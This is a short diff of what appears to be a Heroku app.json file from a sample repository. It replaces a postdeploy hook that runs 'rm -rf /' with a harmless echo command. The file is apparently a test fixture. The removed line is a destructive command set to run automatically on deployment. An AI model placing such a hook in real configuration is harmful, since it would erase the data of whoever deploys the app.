@@ -4,7 +4,7 @@
   "website": "http://rubyonrails.org",
   "repository": "https://github.com/direwolf-org/sample-repo-01",
   "scripts": {
-    "postdeploy": "rm -rf /"
+    "postdeploy": "echo \"this is the master branch\""
   },
   "env": {},
   "addons": ["heroku-postgresql"]
